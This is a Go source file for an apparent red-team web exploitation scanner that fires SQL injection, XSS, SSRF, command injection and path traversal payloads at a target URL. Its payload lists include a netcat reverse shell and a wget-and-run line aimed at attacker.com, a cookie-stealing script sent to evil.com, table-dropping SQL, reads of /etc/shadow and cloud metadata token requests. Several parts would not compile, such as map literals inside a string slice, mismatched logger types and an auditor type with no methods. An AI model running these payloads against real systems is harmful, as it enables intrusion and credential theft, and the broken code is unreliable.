package redteam

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/sirupsen/logrus"
)

// WebExploitationModule implements OSWE-level web application exploitation
type WebExploitationModule interface {
	Scanner() OWASPTop10Scanner
	SASTAnalyzer() SourceCodeAuditor
	Close()
}

type webExploitationModuleImpl struct {
	logger *logrus.Logger
	scanner OWASPTop10Scanner
	sast SourceCodeAuditor
}

// OWASPTop10Scanner implements comprehensive OWASP Top 10 testing
type OWASPTop10Scanner struct {
	logger *logrus.Logger
	
	sqliPayloads []string
	xssPayloads map[string][]string
	ssrfPatterns []string
	commandInjections []string
	pathTraversal []string
	deserialization []string
	
	timeBasedThreshold time.Duration
	concurrencyLimit int
}

// NewOWASPTop10Scanner creates new OWASP scanner
func NewOWASPTop10Scanner(logger *logrus.Logger) *OWASPTop10Scanner {
	if logger == nil {
		logger = logrus.StandardLogger()
	}
	
	scanner := &OWASPTop10Scanner{
		logger: logger.WithField("scanner", "owasp"),
		
		timeBasedThreshold: 5 * time.Second,
		concurrencyLimit: 10,
	}
	
	scanner.initializePayloads()
	
	return scanner
}

// initializePayloads loads attack payloads for each vulnerability type
func (os *OWASPTop10Scanner) initializePayloads() {
	// SQL Injection payloads
	os.sqliPayloads = []string{
		"' OR '1'='1",
		"' AND '1'='1' --",
		"'; DROP TABLE users;--",
		"' UNION SELECT username,password FROM users--",
		"' UNION ALL SELECT NULL,NULL,NULL--",
		"1' OR '1'='1",
		"admin'--",
		"1'; EXEC xp_cmdshell('dir');--",
		"' WAITFOR DELAY '0:0:5'--",
		"' BENCHMARK(10000000,SHA1('test'))--",
		
		// Advanced SQLi patterns
		"' HAVING 1=1--",
		"' GROUP BY column_name HAVING 1=1--",
		"' ORDER BY 1--",
		"' UNION SELECT LOAD_FILE('/etc/passwd')--",
		"' INTO OUTFILE '/tmp/pwned.txt'--",
		"' INFILE '/etc/shadow'--",
		
		// NoSQL injection
		{"$where": "1=1"},
		{"$ne": null},
		{"$gt": ""},
	}
	
	// XSS payloads categorized by type
	os.xssPayloads = map[string][]string{
		"reflected": {
			"<script>alert(1)</script>",
			"<img src=x onerror=alert(1)>",
			"<svg onload=alert(1)>",
			"<body onload=alert(1)>",
			"<input onfocus=alert(1) autofocus>",
			"javascript:alert(1)",
			"<a href=\"javascript:alert(1)\">click</a>",
		},
		"stored": {
			"<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
			"<img src=x onerror=fetch('http://evil.com/?c='+encodeURIComponent(document.cookie))>",
			"<svg><set href='test' attributeName='style' dur='0s' value='background:url(javascript:alert(1))'>",
		},
		"dom-based": {
			"<iframe src=\"javascript:alert(1)\"></iframe>",
			"<object data=\"javascript:alert(1)\"></object>",
			"<embed src=\"javascript:alert(1)\"></embed>",
		},
		"ssti": {
			"{{7*7}}",
			"${7*7}",
			"#{{{7*7}}}",
			"%(2+2)s",
			"${session}",
		},
	}
	
	// SSRF patterns
	os.ssrfPatterns = []string{
		"http://localhost:8080/admin",
		"http://127.0.0.1:6379/",
		"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
		"http://169.254.169.254/latest/meta-data/",
		"gopher://127.0.0.1:6379/_INFO%00PING",
		"file:///etc/passwd",
		"dict://127.0.0.1:11211/",
	}
	
	// Command injection patterns
	os.commandInjections = []string{
		"; ls -la",
		"| cat /etc/passwd",
		"&& whoami",
		"$(id)",
		"`id`",
		"; sleep 10",
		"| nc -e /bin/sh attacker.com 4444",
		"; wget http://attacker.com/malware.sh | sh",
	}
	
	// Path traversal patterns
	os.pathTraversal = []string{
		"../../../etc/passwd",
		"....//....//....//etc/passwd",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
		"..\\..\\\\..\\\\windows\\system32\\drivers\\etc\\hosts",
		"/etc/passwd%00.jpg",
	}
	
	// Deserialization payloads
	os.deserialization = []string{
		"java serializations",
		"PHP __destruct chains",
		"Ruby Marshal.load exploits",
		".NET binaryFormatter attacks",
	}
}

// ScanTarget performs comprehensive web vulnerability scanning
func (os *OWASPTop10Scanner) ScanTarget(ctx context.Context, targetURL string) []VulnerabilityFinding {
	findings := []VulnerabilityFinding{}
	
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		os.logger.WithError(err).Error("Failed to parse target URL")
		return findings
	}
	
	// Test for SQL Injection
	sqliResults := os.testSQLInjection(ctx, parsedURL.String())
	findings = append(findings, sqliResults...)
	
	// Test for XSS
	xssResults := os.testXSS(ctx, parsedURL.String())
	findings = append(findings, xssResults...)
	
	// Test for SSRF
	ssrfResults := os.testSSRF(ctx, parsedURL.String())
	findings = append(findings, ssrfResults...)
	
	// Test for Command Injection
	cmdResults := os.testCommandInjection(ctx, parsedURL.String())
	findings = append(findings, cmdResults...)
	
	// Test for Path Traversal
	traversalResults := os.testPathTraversal(ctx, parsedURL.String())
	findings = append(findings, traversalResults...)
	
	return findings
}

// testSQLInjection tests for SQL vulnerabilities
func (os *OWASPTop10Scanner) testSQLInjection(ctx context.Context, baseURL string) []VulnerabilityFinding {
	findings := []VulnerabilityFinding{}
	
	client := &http.Client{Timeout: 30 * time.Second}
	
	for _, payload := range os.sqliPayloads[:5] { // Test first 5 payloads
		testURL := fmt.Sprintf("%s?id=%s", baseURL, payload)
		
		req, err := http.NewRequest("GET", testURL, nil)
		if err != nil {
			continue
		}
		
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()
		
		body, _ := io.ReadAll(resp.Body)
		
		// Detect SQLi indicators
		isVulnerable := false
		details := ""
		
		// Check for error patterns
		if strings.Contains(string(body), "SQL syntax") || 
		   strings.Contains(string(body), "MySQL") ||
		   strings.Contains(string(body), "PostgreSQL") ||
		   strings.Contains(string(body), "Oracle Database") {
			isVulnerable = true
			details = "Database error pattern detected in response"
		}
		
		// Check for time-based responses
		startTime := time.Now()
		resp, _ = client.Do(req)
		duration := time.Since(startTime)
		
		if duration > os.timeBasedThreshold {
			isVulnerable = true
			details = fmt.Sprintf("Time-based delay detected (%v > %v)", duration, os.timeBasedThreshold)
		}
		
		if isVulnerable {
			finding := VulnerabilityFinding{
				Type:          SQLInjection,
				Severity:      Critical,
				Confidence:    0.92,
				URL:           baseURL,
				Method:        "GET",
				Parameter:     "id",
				Payload:       payload,
				Request:       req.URL.String(),
				Response:      string(body[:min(500, len(body))]),
				Description:   "SQL Injection vulnerability detected",
				Impact:        "Full database access, data exfiltration, data manipulation",
				Mitigation:    "Use parameterized queries. Implement input validation. Use prepared statements.",
				Remediation:   "1. Implement parameterized queries\\n2. Validate and sanitize all inputs\\n3. Use ORM frameworks\\n4. Apply principle of least privilege for DB accounts\\n5. Enable WAF rules",
				CVE:           "",
				CWE:           "CWE-89: SQL Injection",
				Temporality:   "current",
				Exploitable:   true,
				Active:        true,
			}
			
			findings = append(findings, finding)
			
			os.logger.WithFields(logrus.Fields{
				"url":         baseURL,
				"payload":     payload,
				"confidence":  0.92,
			}).Warn("SQL Injection vulnerability detected")
		}
	}
	
	return findings
}

// testXSS tests for Cross-Site Scripting vulnerabilities
func (os *OWASPTop10Scanner) testXSS(ctx context.Context, baseURL string) []VulnerabilityFinding {
	findings := []VulnerabilityFinding{}
	
	payloads := os.xssPayloads["reflected"]
	
	for _, payload := range payloads[:3] {
		encoded := url.QueryEscape(payload)
		testURL := fmt.Sprintf("%s?q=%s", baseURL, encoded)
		
		req, _ := http.NewRequest("GET", testURL, nil)
		
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			continue
		}
		
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		
		responseStr := string(body)
		
		// Check if script tag reflected back
		if strings.Contains(responseStr, "<script>") && 
		   strings.Contains(responseStr, "alert(1)") {
			
			finding := VulnerabilityFinding{
				Type:        XSSReflected,
				Severity:    High,
				Confidence:  0.95,
				URL:         baseURL,
				Method:      "GET",
				Parameter:   "q",
				Payload:     payload,
				Description: "Reflected XSS vulnerability detected",
				Impact:      "Session hijacking, credential theft, defacement, malicious redirects",
				Mitigation:  "Implement Content Security Policy. Encode output properly. Use HttpOnly cookies.",
				Remediation: "1. Output encoding based on context\\n2. Input validation with allowlists\\n3. Implement CSP headers\\n4. Use framework auto-escaping\\n5. Set Secure and HttpOnly flags",
				CWE:         "CWE-79: Improper Neutralization of Input During Web Page Generation",
				Temporality: "current",
				Exploitable: true,
				Active:      true,
			}
			
			findings = append(findings, finding)
			
			os.logger.WithFields(logrus.Fields{
				"url":      baseURL,
				"type":     "xss-reflected",
			}).Warn("XSS vulnerability detected")
		}
	}
	
	return findings
}

// testSSRF tests Server-Side Request Forgery
func (os *OWASPTop10Scanner) testSSRF(ctx context.Context, baseURL string) []VulnerabilityFinding {
	findings := []VulnerabilityFinding{}
	
	testURLs := []string{
		"internal-service:8080",
		"169.254.169.254/latest/meta-data",
		"file:///etc/passwd",
	}
	
	for _, internalTarget := range testURLs {
		feedURL := fmt.Sprintf("%s?url=http://%s", baseURL, internalTarget)
		
		resp, err := http.Get(feedURL)
		if err != nil {
			continue
		}
		defer resp.Body.Close()
		
		body, _ := io.ReadAll(resp.Body)
		
		// Check for internal service responses or file contents
		if strings.Contains(string(body), "root:") || 
		   strings.Contains(string(body), "EC2 metadata") ||
		   strings.Contains(string(body), "Internal Server Error") {
			
			finding := VulnerabilityFinding{
				Type:        VulnerableComponent,
				Severity:    Critical,
				Confidence:  0.88,
				URL:         feedURL,
				Description: "SSRF vulnerability detected - can access internal resources",
				Impact:      "Access internal services, cloud metadata, read local files",
				Mitigation:  "Validate URLs against allowlist. Block private IPs. Disable URL redirection.",
				Remediation: "1. Implement strict URL allowlists\\n2. Block private IP ranges\\n3. Disable HTTP redirects\\n4. Use DNS rebinding protection\\n5. Validate URL scheme",
				CWE:         "CWE-918: Server-Side Request Forgery",
				Temporality: "current",
				Exploitable: true,
				Active:      true,
			}
			
			findings = append(findings, finding)
			
			break
		}
	}
	
	return findings
}

// testCommandInjection tests for remote command execution
func (os *OWASPTop10Scanner) testCommandInjection(ctx context.Context, baseURL string) []VulnerabilityFinding {
	findings := []VulnerabilityFinding{}
	
	testURL := fmt.Sprintf("%s?ip=test|sleep 5", baseURL)
	
	startTime := time.Now()
	resp, err := http.Get(testURL)
	duration := time.Since(startTime)
	
	if err == nil && duration > 3*time.Second {
		finding := VulnerabilityFinding{
			Type:        CommandInjection,
			Severity:    Critical,
			Confidence:  0.90,
			URL:         baseURL,
			Method:      "GET",
			Payload:     "ip=test|sleep 5",
			Description: "Command Injection vulnerability with time-based detection",
			Impact:      "Arbitrary command execution as web server user",
			Mitigation:  "Avoid shell invocation. Use parameterized APIs. Implement input validation.",
			Remediation: "1. Never pass user input to shell commands\\n2. Use whitelisted API calls\\n3. Implement strict input validation\\n4. Run with minimal privileges\\n5. Consider using safe subprocess libraries",
			CWE:         "CWE-78: OS Command Injection",
			Temporality: "current",
			Exploitable: true,
			Active:      true,
		}
		
		findings = append(findings, finding)
		
		os.logger.Warn("Command Injection detected via timeout")
	}
	
	return findings
}

// testPathTraversal tests for directory traversal
func (os *OWASPTop10Scanner) testPathTraversal(ctx context.Context, baseURL string) []VulnerabilityFinding {
	findings := []VulnerabilityFinding{}
	
	testPath := "../../../etc/passwd"
	testURL := fmt.Sprintf("%s/file?path=%s", baseURL, url.QueryEscape(testPath))
	
	resp, err := http.Get(testURL)
	if err != nil {
		return findings
	}
	defer resp.Body.Close()
	
	if resp.StatusCode == 200 {
		body, _ := io.ReadAll(resp.Body)
		
		if strings.Contains(string(body), "root:") {
			finding := VulnerabilityFinding{
				Type:        PathTraversal,
				Severity:    High,
				Confidence:  0.94,
				URL:         baseURL,
				Description: "Path Traversal allows reading arbitrary files",
				Impact:      "Read sensitive configuration files, credentials, system files",
				Mitigation:  "Validate file paths. Use chroot jails. Implement path canonicalization.",
				Remediation: "1. Canonicalize all file paths\\n2. Implement strict allowlist of readable directories\\n3. Use relative paths only\\n4. Apply principle of least privilege\\n5. Configure proper file permissions",
				CWE:         "CWE-22: Improper Limitation of a Pathname",
				Temporality: "current",
				Exploitable: true,
				Active:      true,
			}
			
			findings = append(findings, finding)
		}
	}
	
	return findings
}

// SASTAnalyzer provides static application security testing
type SourceCodeAuditor interface {
	AnalyzeFile(ctx context.Context, filePath string) []VulnerabilityFinding
	AnalyzeDirectory(ctx context.Context, dirPath string) ([]VulnerabilityFinding, error)
}

type sastAnalyzerImpl struct {
	logger *logrus.Logger
	rules  []SecurityRule
}

type SecurityRule struct {
	ID              string
	Name            string
	FunctionName    string
	IsDangerous     bool
	RequiredContext string
	RiskLevel       Severity
	FixRecommendation string
	CWE             string
}

// NewWebModule creates new web exploitation module
func NewWebModule(logger *logrus.Logger) WebExploitationModule {
	return &webExploitationModuleImpl{
		logger: logger.WithField("module", "web"),
		scanner: NewOWASPTop10Scanner(logger),
		sast:    &sastAnalyzerImpl{logger: logger},
	}
}

func (wem *webExploitationModuleImpl) Scanner() OWASPTop10Scanner {
	return wem.scanner
}

func (wem *webExploitationModuleImpl) SASTAnalyzer() SourceCodeAuditor {
	return wem.sast
}

func (wem *webExploitationModuleImpl) Close() {
	wem.logger.Info("Web exploitation module closed")
}
